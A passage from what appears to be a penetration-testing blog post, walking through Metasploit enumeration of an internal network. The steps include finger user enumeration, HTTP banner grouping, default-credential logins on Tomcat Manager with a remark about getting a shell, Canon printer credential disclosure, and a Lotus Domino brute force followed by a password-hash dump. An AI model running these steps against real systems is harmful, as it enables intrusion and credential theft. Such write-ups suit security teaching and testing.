</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>Finger | Port 79</h3>

<ol>
<strong>Metasploit</strong> has a 
<li><strong>Finger Service User Enumerator</strong> which can be used to identify users.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/finger/finger_users
</span><span class='line'>services -p 79 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 172.30.xx.xx:79 - Found user: adm
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: lp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: uucp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nuucp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: listen
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: bin
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: daemon
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: gdm
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: noaccess
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nobody
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nobody4
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: oracle
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: postgres
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: root
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: svctag
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: sys
</span><span class='line'>[+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/finger.html">finger.nse</a>  : Attempts to retrieve a list of usernames using the finger service.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>Same can be done using</p>

<ul>
<li>finger command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger root 172.30.xx.xx
</span><span class='line'>finger: 172.30.xx.xx: no such user.
</span><span class='line'>Login: root                       Name: root
</span><span class='line'>Directory: /root                      Shell: /bin/bash
</span><span class='line'>Last login Sat Feb  6 22:43 (IST) on tty1
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>


<h3>HTTP</h3>

<p>Let&rsquo;s first get a hold of what services are running on the network by checking the different banners</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 80 -c port,name,info -u -o /tmp/http.ports
</span><span class='line'>cat /tmp/http.ports | cut -d , -f2,3,4 | sort | uniq | tr -d \" | grep -v port | sort -n</span></code></pre></td></tr></table></div></figure>


<p>Sample Services running</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>80,http,3Com switch http config
</span><span class='line'>80,http,3Com switch webadmin 1.0
</span><span class='line'>80,http,Agranat-EmWeb 5.2.6 HP LaserJet http config
</span><span class='line'>80,http,Allegro RomPager 4.01
</span><span class='line'>80,http,Allegro RomPager 4.30
</span><span class='line'>80,http,Allen-Bradley 1761-NET-ENIW http config
</span><span class='line'>80,http,Apache-Coyote/1.1
</span><span class='line'>80,http,Apache-Coyote/1.1 ( 401-Basic realm=Tomcat Manager Application )
</span><span class='line'>80,http,Apache httpd
</span><span class='line'>80,http,Apache httpd 0.6.5
</span><span class='line'>80,http,Apache httpd 1.3.27 (Unix) (Red-Hat/Linux) PHP/4.1.2 mod_perl/1.24_01
</span><span class='line'>80,http,Apache httpd 2.0.63 (CentOS)
</span><span class='line'>80,http,Apache httpd 2.2.10 (Fedora)
</span><span class='line'>80,http,Apache httpd 2.2.15 (Red Hat)
</span><span class='line'>80,http,Apache httpd 2.2.17 (Win32)
</span><span class='line'>80,http,Apache httpd 2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1
</span><span class='line'>80,http,Apache httpd 2.2.22 (Ubuntu)
</span><span class='line'>80,http,Apache httpd 2.2.22 (Unix)
</span><span class='line'>80,http,Apache httpd 2.2.3 (CentOS)
</span><span class='line'>80,http,Apache httpd 2.2.3 (Red Hat)
</span><span class='line'>80,http,Apache httpd 2.4.12 (Unix)
</span><span class='line'>80,http,Apache httpd 2.4.7 (Ubuntu)
</span><span class='line'>80,http,Apache httpd 2.4.9 (Win32) PHP/5.5.12
</span><span class='line'>80,http,Apache httpd 2.4.9 (Win64)
</span><span class='line'>80,http,Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>80,http,AudioCodes MP-202 VoIP adapter http config
</span><span class='line'>80,http,BenQ projector Crestron RoomView
</span><span class='line'>80,http,Boa HTTPd 0.94.14rc19
</span><span class='line'>80,http,BusyBox httpd 1.13
</span><span class='line'>80,http,Canon Pixma IP4000R printer http config KS_HTTP 1.0
</span><span class='line'>80,http,Canon printer web interface
</span><span class='line'>80,http,Check Point NGX Firewall-1
</span><span class='line'>80,http,ChipPC Extreme httpd
</span><span class='line'>80,http,Cisco IOS http config
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 5.6.100
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.0.0
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.0.2
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.2.0
</span><span class='line'>80,http,Crestron MPS-200 AV routing system http config
</span><span class='line'>80,http,Crestron PRO2 automation system web server
</span><span class='line'>80,http,Debut embedded httpd 1.20 Brother/HP printer http admin
</span><span class='line'>80,http,Dell N2000-series switch http admin
</span><span class='line'>80,http,Dell PowerVault TL4000 http config
</span><span class='line'>80,http,D-Link print server http config 1.0
</span><span class='line'>80,http,Embedthis HTTP lib httpd
</span><span class='line'>80,http,Gembird/Hawking/Netgear print server http config
</span><span class='line'>80,http,GoAhead WebServer
</span><span class='line'>80,http,GoAhead WebServer LinkSys SLM2024 or SRW2008 - SRW2016 switch http config
</span><span class='line'>80,http,GoAhead WebServer Router with realtek 8181 chipset http config
</span><span class='line'>80,http,HP-ChaiSOE 1.0 HP LaserJet http config
</span><span class='line'>80,http,HP Deskjet 3050 J610 printer http config Serial CN12E3937Y05HX
</span><span class='line'>80,http,HP Deskjet 3520 printer http config Serial CN3471G0QJ05T0
</span><span class='line'>80,http,HP Deskjet 3540 printer http config Serial CN41K2T0RN05X6
</span><span class='line'>80,http,HP Integrated Lights-Out web interface 1.30
</span><span class='line'>80,http,HP LaserJet 1022n printer http config 4.0.xx.xx
</span><span class='line'>80,http,HP LaserJet CP1205nw or P1606 http config
</span><span class='line'>80,http,HP LaserJet P2014n printer http config 4.2
</span><span class='line'>80,http,HP Officejet 7610 printer http config Serial CN5293M07X064N
</span><span class='line'>80,http,HP Officejet Pro X576dw printer http config Serial CN4BDJX0RC
</span><span class='line'>80,http,HP ProCurve 1800-24G switch http config
</span><span class='line'>80,http,HP ProCurve httpd
</span><span class='line'>80,http,Jetty 6.1.x
</span><span class='line'>80,http,Konica Minolta PageScope Web Connection httpd
</span><span class='line'>80,http,Liaison Exchange Commerce Suite
</span><span class='line'>80,http,lighttpd
</span><span class='line'>80,http,lighttpd 1.4.23
</span><span class='line'>80,http,lighttpd 1.4.28
</span><span class='line'>80,http,lighttpd 1.4.29
</span><span class='line'>80,http,lighttpd 1.4.32
</span><span class='line'>80,http,lighttpd 1.4.33
</span><span class='line'>80,http,Linksys PAP2 VoIP http config
</span><span class='line'>80,http,Lotus Domino httpd
</span><span class='line'>80,http,Mathopd httpd 1.5p6
</span><span class='line'>80,http,Mbedthis-Appweb 2.4.0
</span><span class='line'>80,http,Mbedthis-Appweb 2.4.2
</span><span class='line'>80,http,Mbedthis-Appweb 2.5.0
</span><span class='line'>80,http,Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
</span><span class='line'>80,http,Microsoft-IIS/10.0
</span><span class='line'>80,http,Microsoft-IIS/10.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/5.1
</span><span class='line'>80,http,Microsoft-IIS/5.1 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/6.0
</span><span class='line'>80,http,Microsoft-IIS/6.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/7.5
</span><span class='line'>80,http,Microsoft-IIS/7.5 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/8.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/8.5
</span><span class='line'>80,http,Microsoft-IIS/8.5 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft IIS httpd 10.0
</span><span class='line'>80,http,Microsoft IIS httpd 5.1
</span><span class='line'>80,http,Microsoft IIS httpd 6.0
</span><span class='line'>80,http,Microsoft IIS httpd 7.5
</span><span class='line'>80,http,Microsoft IIS httpd 8.0
</span><span class='line'>80,http,Microsoft IIS httpd 8.5
</span><span class='line'>80,http,MoxaHttp 1.0
</span><span class='line'>80,http,nginx 1.2.2
</span><span class='line'>80,http,Omron PLC http config
</span><span class='line'>80,http,Oracle HTTP Server Powered by Apache 1.3.22 mod_plsql/3.0.xx.xx.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25
</span><span class='line'>80,http,Panasonic WV-NF284 webcam http config
</span><span class='line'>80,http,Panasonic WV-NP304 webcam http config
</span><span class='line'>80,http,Panasonic WV-NW960 webcam http config
</span><span class='line'>80,http-proxy,Squid http proxy 2.5.STABLE4
</span><span class='line'>80,http,RapidLogic httpd 1.1
</span><span class='line'>80,http,Samsung SyncThru Web Service M337x 387x 407x series; SN: ZDFABJEF600007W
</span><span class='line'>80,http,uc-httpd 1.0.0
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP JetDirect http config
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP LaserJet 3055 printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP LaserJet http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP LaserJet M1522nf MFP printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP printer http config
</span><span class='line'>80,http,VMware ESXi 4.1 Server httpd
</span><span class='line'>80,http,VMware ESXi Server httpd
</span><span class='line'>80,http,Web-Server httpd 3.0 Ricoh Aficio printer web image monitor
</span><span class='line'>80,http,Western Digital My Book http config
</span><span class='line'>80,http,Zero One Technology 11 httpd 5.4.2049
</span><span class='line'>80,http,Zero One Technology 15 httpd 6.8.0104
</span><span class='line'>80,http,Zero One Technology 30 httpd 8.3.0013
</span><span class='line'>80,http,Zero One Technology 35 httpd 6.2.0001
</span><span class='line'>80,ipp,Canon printer http config 1.00
</span><span class='line'>80,ipp,Canon printer http config 2.10
</span><span class='line'>80,ipp,Canon printer http config 2.21
</span><span class='line'>80,ipp,HP Officejet Pro 8600 ipp model CM750A; serial CN314B3J9905SN
</span><span class='line'>80,ipp,Web-Server httpd 3.0 NRG copier or Ricoh Aficio printer http config
</span><span class='line'>80,rtsp,
</span><span class='line'>80,soap,gSOAP soap 2.7
</span><span class='line'>80,tcpwrapped,
</span><span class='line'>80,tcpwrapped,Cisco IOS http config
</span><span class='line'>80,tcpwrapped,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
</span><span class='line'>80,upnp,Epson Stylus NX230 printer UPnP UPnP 1.0; Epson UPnP SDK 1.0
</span><span class='line'>80,wsman,Openwsman</span></code></pre></td></tr></table></div></figure>


<p>So, A lot of stuff, Let&rsquo;s test them for one by one.</p>

<ol>
<li><strong>Webmin</strong>
Searching for webmin in Metasploit gave three modules
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
</span><span class='line'>   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
</span><span class='line'>   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution</span></code></pre></td></tr></table></div></figure>
but our webmin versions are different.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/admin/webmin/edit_html_fileaccess requires Webmin 1.580 plus it requires authenticated user.
</span><span class='line'>auxiliary/admin/webmin/file_disclosure Webmin (versions prior to 1.290) and Usermin (versions prior to 1.220)
</span><span class='line'>exploit/unix/webapp/webmin_show_cgi_exec in Webmin 1.580</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Moving on to <strong>Apache Tomcat</strong>

Searching for Tomcat
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -S "Tomcat"
</span><span class='line'>
</span><span class='line'>Services
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>host          port  proto  name      state  info
</span><span class='line'>----          ----  -----  ----      -----  ----
</span><span class='line'>10.10.xx.xx   8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx  1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx  8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx  80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.17.xx.xx   8081  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.23.xx.xx    8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.25.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.87.xx.xx    8081  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1</span></code></pre></td></tr></table></div></figure>
We get multiple tomcat manager applications running. Let's see what we have for Tomcat

<ul>
<li>
<strong>Tomcat Application Manager Login Utility</strong> which checks for default tomcat username and passwords
using the above module
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/tomcat_mgr_login
</span><span class='line'>services -p 8080 -S "Tomcat Manager" -R
</span><span class='line'>
</span><span class='line'>Run the scan for other ports also above 8443, 80, 1311, 8081 :)</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] 10.25.xx.xx:8080 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )
</span><span class='line'>[*] Scanned 6 of 7 hosts (85% complete)
</span><span class='line'>[+] 10.87.xx.xx:8080 - LOGIN SUCCESSFUL: admin:admin
</span><span class='line'>[+] 10.10.xx.xx:80 - LOGIN SUCCESSFUL: tomcat:tomcat</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
Yay :) We got two apache tomcat we can upload WAR files and get shell ;)

</li>
<li>
Searching for <strong>Canon</strong>

found a interesting module <strong>Canon Printer Wireless Configuration Disclosure</strong> enumerates wireless credentials from Canon printers with 
  a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870, MX890, MX920. We still need to figure out what is Options.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/canon_wireless</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] 10.23.xx.xx:80 File not found
</span><span class='line'>[+] 10.23.xx.xx:80 Option: 
</span><span class='line'>[-] 10.23.xx.xx:80 Could not determine LAN Settings.</span></code></pre></td></tr></table></div></figure>

</li>
<li><strong>Lotus Domino httpd</strong>
Searching for Lotus Domino we got few modules
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     Lotus Domino Password Hash Collector
</span><span class='line'>   auxiliary/scanner/lotus/lotus_domino_login                                normal     Lotus Domino Brute Force Utility
</span><span class='line'>   auxiliary/scanner/lotus/lotus_domino_version                              normal     Lotus Domino Version</span></code></pre></td></tr></table></div></figure>
Let's try them one by one

<strong>Lotus Domino Version</strong> which determines Lotus Domino Server Version by several checks.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_version
</span><span class='line'>services -p 80 -S "Lotus" -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:80 Lotus Domino Base Install Version: ["9.0.0.0"]</span></code></pre></td></tr></table></div></figure>
Let's try <strong>Lotus Domino Login</strong> which is Lotus Domino Authentication Brute Force Utility with our default passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_login
</span><span class='line'>services -p 80 -S "Lotus" -R
</span><span class='line'>set USERNAME admin
</span><span class='line'>set PAsSwoRD example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:80 LOTUS_DOMINO - [1/1] - Lotus Domino - Trying username:'admin' with password:'example@123'
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL login for 'admin' : 'example@123</span></code></pre></td></tr></table></div></figure>
Using the above credentials we can use lotus_domino_hashes (Lotus Domino Password Hash Collector) module to download user hashes.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_hashes
</span><span class='line'>services -p 80 -S "Lotus" -R
</span><span class='line'>set NOTES_USER admin
</span><span class='line'>set NOTES_PASS example@123</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] http://10.10.xx.xx:80 - Lotus Domino - Trying dump password hashes with given credentials
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL authentication for 'admin'
</span><span class='line'>[*] http://10.10.xx.xx:80 - Lotus Domino - Getting password hashes
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - Account Found: nadmin, notesadmin@example.com, (GEo1MDjKxxxxxxxxxxx)(GEo1MDjKxxxxxxxxxxx)</span></code></pre></td></tr></table></div></figure>
</li>


<li>
For <strong>IIS</strong>

We can check if WebDAV is enabled on the websites running IIS by <strong>HTTP WebDAV Scanner</strong> which detect webservers with WebDAV enabled.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/webdav_scanner</span></code></pre></td></tr></table></div></figure>
Sample Output: Mostly old IIS like 5.1/6.0 would have WebDAV enabled. It is disabled by default in the newer versions.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.87.xx.xx (Microsoft-IIS/5.1) has WEBDAV ENABLED</span></code></pre></td></tr></table></div></figure>
</li>

<li>For <strong>VMware ESXi</strong>

<ul>
<li>Let's find what version they are running by <strong>VMWare ESX/ESXi Fingerprint Scanner</strong> which accesses the web API interfaces for VMware ESX/ESXi servers and attempts to identify version information for that 
  server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vmware/esx_fingerprint
</span><span class='line'>services -p 80 -S VMware</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
